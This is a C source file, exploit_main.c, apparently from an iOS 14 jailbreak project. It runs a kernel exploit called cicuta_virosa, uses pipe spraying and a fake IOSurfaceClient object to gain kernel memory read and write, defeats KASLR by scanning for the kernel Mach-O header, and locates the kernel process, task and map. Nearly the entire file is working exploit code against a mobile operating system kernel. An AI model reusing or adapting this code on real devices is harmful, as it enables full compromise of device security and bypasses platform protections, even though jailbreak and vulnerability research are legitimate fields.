//
//  exploit_main.c
//  pre-jailbreak
//
//  Created by Quote on 2021/2/19.
//

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/time.h>
#include <mach/mach.h>

#include "../mylib/mycommon.h"
#include "../mylib/k_offsets.h"
#include "../mylib/utils.h"
#include "../mylib/k_utils.h"
#include "../mylib/kapi.h"
#include "../mylib/user_kernel_alloc.h"
#include "cicuta_virosa/cicuta_virosa.h"
#include "patchfinder64.h"

extern mach_port_t IOSurfaceRootUserClient;
uint32_t iosurface_create_fast(void);
uint32_t iosurface_s_get_ycbcrmatrix(void);
void iosurface_s_set_indexed_timestamp(uint64_t v);

static int *pipefds;
static size_t pipe_buffer_size = 0x1000;
static uint8_t *pipe_buffer;
static kptr_t IOSurfaceRoot_uc;
static uint32_t InitInfo_surfaceId = 0;
static uint64_t kObject_AppleAVE2Driver = 0;
static uint64_t kObject_IOSurface = 0;

static uint64_t our_task_kAddr = 0;
uint64_t our_proc_kAddr = 0;
uint64_t kernel_proc_kAddr = 0;
extern uint64_t our_proc_kAddr;

static void read_pipe()
{
    size_t read_size = pipe_buffer_size - 1;
    ssize_t count = read(pipefds[0], pipe_buffer, read_size);
    if (count == read_size) {
        return;
    } else if (count == -1) {
        perror("read_pipe");
        util_error("could not read pipe buffer");
    } else if (count == 0) {
        util_error("pipe is empty");
    } else {
        util_error("partial read %zu of %zu bytes", count, read_size);
    }
    fail_info(__FUNCTION__);
}

static void write_pipe()
{
    size_t write_size = pipe_buffer_size - 1;
    ssize_t count = write(pipefds[1], pipe_buffer, write_size);
    if (count == write_size) {
        return;
    } else if (count < 0) {
        util_error("could not write pipe buffer");
    } else if (count == 0) {
        util_error("pipe is full");
    } else {
        util_error("partial write %zu of %zu bytes", count, write_size);
    }
    fail_info(__FUNCTION__);
}

static void build_stable_kmem_api()
{
    static kptr_t pipe_base;
    kptr_t p_fd = kapi_read_kptr(g_exp.self_proc + OFFSET(proc, p_fd));
    kptr_t fd_ofiles = kapi_read_kptr(p_fd + OFFSET(filedesc, fd_ofiles));
    kptr_t rpipe_fp = kapi_read_kptr(fd_ofiles + sizeof(kptr_t) * pipefds[0]);
    kptr_t fp_glob = kapi_read_kptr(rpipe_fp + OFFSET(fileproc, fp_glob));
    kptr_t rpipe = kapi_read_kptr(fp_glob + OFFSET(fileglob, fg_data));
    pipe_base = kapi_read_kptr(rpipe + OFFSET(pipe, buffer));

    // XXX dirty hack, but I'm lucky :)
    uint8_t bytes[20];
    read_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);
    *(kptr_t *)(bytes + 4) = pipe_base;
    write_20(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients) - 4, bytes);

    // iOS 14.x only
    struct fake_client {
        kptr_t pad_00; // can not use IOSurface 0 now
        kptr_t uc_obj;
        uint8_t pad_10[0x40]; // start of IOSurfaceClient obj
        kptr_t surf_obj;
        uint8_t pad_58[0x360 - 0x58];
        kptr_t shared_RW;
    };

    stage0_read32 = ^uint32_t (kptr_t addr) {
        struct fake_client *p = (void *)pipe_buffer;
        p->uc_obj = pipe_base + 16;
        p->surf_obj = addr - 0xb4;
        write_pipe();
        uint32_t v = iosurface_s_get_ycbcrmatrix();
        read_pipe();
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = stage0_read32(addr);
        v |= (uint64_t)stage0_read32(addr + 4) << 32;
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint32_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read32(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 4 ? 4 : len - pos);
            pos += 4;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        struct fake_client *p = (void *)pipe_buffer;
        p->uc_obj = pipe_base + 0x10;
        p->surf_obj = pipe_base;
        p->shared_RW = addr;
        write_pipe();
        iosurface_s_set_indexed_timestamp(v);
        read_pipe();
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 8;
            if (bytes > len - pos) {
                bytes = len - pos;
                v = stage0_read64(addr + pos);
            }
            memcpy(&v, _data + pos, bytes);
            stage0_write64(addr + pos, v);
            pos += 8;
        }
    };
}

static void build_stage0_kmem_api()
{
    stage0_read32 = ^uint32_t (kptr_t addr) {
        uint32_t v = read_32(addr);
        return v;
    };

    stage0_read64 = ^uint64_t (kptr_t addr) {
        uint64_t v = read_64(addr);
        return v;
    };

    stage0_read_kptr = ^kptr_t (kptr_t addr) {
        uint64_t v = stage0_read64(addr);
        if (v && (v >> 39) != 0x1ffffff) {
            if (g_exp.debug) {
                util_info("PAC %#llx -> %#llx", v, v | 0xffffff8000000000);
            }
            v |= 0xffffff8000000000; // untag, 25 bits
        }
        return (kptr_t)v;
    };

    stage0_read = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint64_t v;
        size_t pos = 0;
        while (pos < len) {
            v = stage0_read64(addr + pos);
            memcpy(_data + pos, &v, len - pos >= 8 ? 8 : len - pos);
            pos += 8;
        }
    };

    stage0_write64 = ^void (kptr_t addr, uint64_t v) {
        stage0_write(addr, &v, sizeof(v));
    };

    stage0_write = ^void (kptr_t addr, void *data, size_t len) {
        uint8_t *_data = data;
        uint8_t v[20];
        size_t pos = 0;
        while (pos < len) {
            size_t bytes = 20;
            if (bytes > len - pos) {
                bytes = len - pos;
                read_20(addr + pos, v);
            }
            memcpy(v, _data + pos, bytes);
            write_20(addr + pos, v);
            pos += 20;
        }
    };
}

void exploit_main(void)
{
    sys_init();
    util_info("---- Offsets ----");
    kernel_offsets_init();
    util_info("---- Xong ----\n");
    util_info("---- Surface ----");
    bool ok = IOSurface_init();
    fail_if(!ok, "can not init IOSurface lib");
    uint32_t surf_id = iosurface_create_fast();
    util_info("surface_id %u", surf_id);
    util_info("---- Xong ----\n");
    size_t pipe_count = 1;
    pipefds = create_pipes(&pipe_count);
    pipe_buffer = (uint8_t *)malloc(pipe_buffer_size);
    memset_pattern4(pipe_buffer, "pipe", pipe_buffer_size);
    pipe_spray(pipefds, 1, pipe_buffer, pipe_buffer_size, NULL);
    read_pipe();

    struct timeval tv1, tv2;
    gettimeofday(&tv1, NULL);
    util_info("---- Khai thác Kernel ----");
    cicuta_virosa();
    gettimeofday(&tv2, NULL);
    uint64_t cost = (tv2.tv_sec - tv1.tv_sec) * 1000 * 1000 + tv2.tv_usec - tv1.tv_usec;
    util_info("%.3f giây", cost / 1000000.0);
    util_info("---- Xong ----\n");
    
    util_info("---- Kernel ----");
    build_stage0_kmem_api();
    
    util_info("self_task %llx", g_exp.self_task);
    g_exp.self_ipc_space = kapi_read_kptr(g_exp.self_task + OFFSET(task, itk_space));
    g_exp.self_proc = kapi_read_kptr(g_exp.self_task + OFFSET(task, bsd_info));

    IOSurfaceRoot_uc = port_name_to_kobject(IOSurfaceRootUserClient);
    kptr_t surfaceClients = kapi_read_kptr(IOSurfaceRoot_uc + OFFSET(IOSurfaceRootUserClient, surfaceClients));
    kptr_t IOSurfaceClient_obj = kapi_read_kptr(surfaceClients + sizeof(kptr_t) * surf_id);

    util_info("Kernel r/w");
    build_stable_kmem_api();
    util_info("---- done ----");

    kptr_t vt_ptr = kapi_read64(IOSurfaceClient_obj);
    if ((vt_ptr >> 39) != 0x1ffffff) {
        g_exp.has_PAC = true;
    }

   // kaslr_bypass();
    util_info("Defeat KASLR");
    
    kptr_t IOSurfaceClient_vt;
    kptr_t IOSurfaceClient_vt_2; // OSObject::release
    IOSurfaceClient_vt = kapi_read_kptr(IOSurfaceClient_obj);
    IOSurfaceClient_vt_2 = kapi_read_kptr(IOSurfaceClient_vt + 2 * sizeof(kptr_t));

    util_info("vt %#llx, vt[2] %#llx", IOSurfaceClient_vt, IOSurfaceClient_vt_2);
    util_msleep(100);

    const uint32_t mach_header[4] = { 0xfeedfacf, 0x0100000c, 0, 2 };
    uint32_t data[4];
    kptr_t kernel_base = IOSurfaceClient_vt_2; // located in __TEXT_EXEC
    kernel_base &= ~(g_exp.pagesize - 1);
    while (1) {
        kapi_read(kernel_base, data, sizeof(mach_header));
        data[2] = mach_header[2]; // ignore CPU subtype
        if (!memcmp(mach_header, data, sizeof(mach_header))) {
            break; // found
        }
        kernel_base -= g_exp.pagesize;
    }
    g_exp.kernel_base = kernel_base;
    g_exp.kernel_slide = kernel_base - kc_kernel_base;
    // assume that kc_kernel_base always equals to 0xFFFFFFF007004000
    util_info("kernel base %#llx", g_exp.kernel_base);
    util_info("kernel slide %#llx", g_exp.kernel_slide);
    
    g_exp.kernel_proc = kproc_find_pid0(g_exp.self_proc);
    g_exp.kernel_task = kapi_read_kptr(g_exp.kernel_proc + OFFSET(proc, task));
    util_info("kernel_proc %#llx", g_exp.kernel_proc);
    util_info("kernel_task %#llx", g_exp.kernel_task);
    g_exp.kernel_map = kapi_read_kptr(g_exp.kernel_task + OFFSET(task, map));
    util_info("kernel_map %#llx", g_exp.kernel_map);

    // device&OS dependent
    // end

    g_exp.self_proc = kproc_find_by_pid(getpid());
    util_info("self_proc %#llx", g_exp.self_proc);
    util_msleep(100);

    g_exp.self_task = kapi_read_kptr(g_exp.self_proc + OFFSET(proc, task));
    g_exp.self_ipc_space = kapi_read_kptr(g_exp.self_task + OFFSET(task, itk_space));
    util_info("self_task %#llx", g_exp.self_task);
    util_info("self_ipc_space %#llx", g_exp.self_ipc_space);

    if (g_exp.debug) {
        util_info("---- kernel cred ----");
        debug_dump_proc_cred(g_exp.kernel_proc);
        util_info("---- self cred ----");
        debug_dump_proc_cred(g_exp.self_proc);
    }
    util_info("---- Xong ----\n");
    post_exploit();

    // clean KHEAP by yourself
}
